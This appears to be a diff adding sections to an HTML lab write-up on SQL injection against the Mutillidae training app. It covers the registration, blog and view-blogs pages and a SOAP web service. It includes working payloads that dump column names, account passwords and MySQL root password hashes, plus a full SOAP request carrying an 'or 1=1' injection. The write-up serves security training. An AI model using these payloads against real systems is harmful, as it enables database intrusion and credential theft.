@@ -108,12 +108,56 @@ hacker',(SELECT password FROM accounts WHERE username LIKE '%admin' ))#
 	<li>
 		<b>Register yourself page</b>
 		You can register by using data from other columns as one of the fields. We cannot however read from <b>the same table</b> we are INSERTING into. Hence unfortunately we cannot read from the accounts table (containing username and password). We can however get crucial column Name by using these. We are targeting the metainfo stored in <b>information_schema </b>. In Oracle we would target all_tabs_columns. 
-		Put the following in the username field of registration page. The field we are injected into is the signature field. Since we cannot read from accounts , we can definitely try to read from the vulnerable <b><i>mysql.user</i></b>. The first two queries are when you want to scan the tables for columns. 
+		Put the following in the username field of registration page. The field we are injected into is the signature field. Since we cannot read from accounts , we can definitely try to read from the vulnerable <b><i>mysql.user</i></b>. The first two queries are when you want to scan the tables for columns. Ofcourse, this is one of many ways of SQL injecting this page
+		<b>Signature Field</b>
 		<pre>
 hacker','1',(SELECT column_name from information_schema.columns where table_name='accounts' and column_name LIKE '%user%' LIMIT 1))#
 hacker','1',(SELECT column_name from information_schema.columns where table_name='accounts' and column_name LIKE '%pass%' LIMIT 1))#
 hacker','1',(select password from mysql.user where user=’root’ LIMIT 0,1)#
-		</pre>  
+		</pre>
+	</li>
+	<li>
+		<b> Add your Blogs</b>
+		<p>
+		Lot of other vulnerabilites in this page, related to injection such as Javascript and cookie stealing. The SQL vulnerability however can be exploited by using the view all blogs page.
+		You can forge a date, but those are not interesting exploits. 
+		</p>
+		<p>
+			My attempt was to INSERT a value by using select statement but could not escape quotes in doing so. I will continue my attempts and see how to bypass this. 
+			I tried to add the following...
+			<pre>
+a'+(SELECT password FROM accounts WHERE username LIKE '%admin' )+'b
+			</pre>
+			This was done as I have no control over the user, and the next field is date, so I will have to limit my injection to this column. I am sure , I am limited here only by my knowlege of SQL.
+		</p>
+	</li>
+	<li>
+		<b>View Blogs</b>
+		Aside from the XSS injection, we could do an SQL injection attack. Intercept using Burpsuite, and modify the username field (selected from the dropdown list of the browser interface) to this.
+		<pre>
+=hola' UNION SELECT NULL,password, username,NULL FROM accounts #
+	    </pre>
+	</li>
+	<li>
+	In principle the attacks have no difference, as the motive is the same. Hence we just change the inout and let the SOAP service inject the data into the backend SQL service instead of the traditional web forms
+	<pre>
+POST /mutillidae/webservices/soap/ws-user-account.php HTTP/1.1 
+Accept-Encoding: gzip,deflate 
+Content-Type: text/xml;charset=UTF-8 
+Content-Length: 438
+Host: localhost 
+Connection: Keep-Alive 
+User-Agent: Apache-HttpClient/4.1.1 (java 1.5) 
+<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:ws-user-account"> 
+
+<soapenv:Header/> 
+<soapenv:Body> 
+<urn:getUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> 
+<username xsi:type="xsd:string">a'or 1=1#</username> 
+</urn:getUser> 
+</soapenv:Body> 
+</soapenv:Envelope>
+</pre>
 	</li>
 </ol>
 </p>
